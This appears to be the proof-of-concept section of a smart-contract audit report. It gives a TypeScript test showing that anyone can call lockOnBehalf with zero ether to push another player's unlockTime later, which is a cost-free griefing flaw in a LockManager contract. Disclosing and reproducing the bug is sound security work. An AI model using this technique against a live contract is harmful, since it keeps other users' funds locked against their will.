## Proof of Concept

To reproduce the test, add the following code to `./test/managers/LockManager/lock.test.ts`

```solidity
  describe("Calling lockOnBehalf with 0 ether", () => {
    beforeEach(async () => {
      // Set Bob's balance to 10 ether to ensure he has sufficient funds,
      // although in this test case he will be locking 0 ether.
      await testClient.setBalance({
        address: bob,
        value: parseEther("10"),
      });
    });

    it("should lock 0 amount for other player and increase recipient's unlockTime", async () => {
      // First, read the initial unlockTime for Alice
      let lockedTokens = await testContracts.lockManager.contract.read.getLocked([alice]);
      const initialLockedToken = lockedTokens.find(
        (t) => t.tokenContract === zeroAddress
      );
      const initialUnlockTime = initialLockedToken
        ? Number(initialLockedToken.lockedToken.unlockTime)
        : 0;

      // Simulate the lockOnBehalf function call with 0 ether on behalf of Alice.
      // Bob is the sender, Alice is the recipient.
      const { request } = await testContracts.lockManager.contract.simulate.lockOnBehalf(
        [zeroAddress, parseEther("0"), alice],
        { account: bob, value: parseEther("0") }
      );
      const txHash = await testClient.writeContract(request);
      await assertLockSuccess({
        testContracts,
        testERC20Contract,
        numberNFTs: 0n,
        player: alice,
        quantity: parseEther("0"),
        lockedQuantity: parseEther("0"),
        remainder: 0n,
        sender: bob,
        tokenContractAddress: zeroAddress,
        txHash,
      });

      // Read the updated unlockTime for Alice
      lockedTokens = await testContracts.lockManager.contract.read.getLocked([alice]);
      const updatedLockedToken = lockedTokens.find(
        (t) => t.tokenContract === zeroAddress
      );
      const updatedUnlockTime = Number(updatedLockedToken.lockedToken.unlockTime);

      // Assert that the unlockTime has increased
      assert.ok(
        updatedUnlockTime > initialUnlockTime,
        `Expected unlockTime to increase, but it didn't. Initial: ${initialUnlockTime}, Updated: ${updatedUnlockTime}`
      );
    });
  });
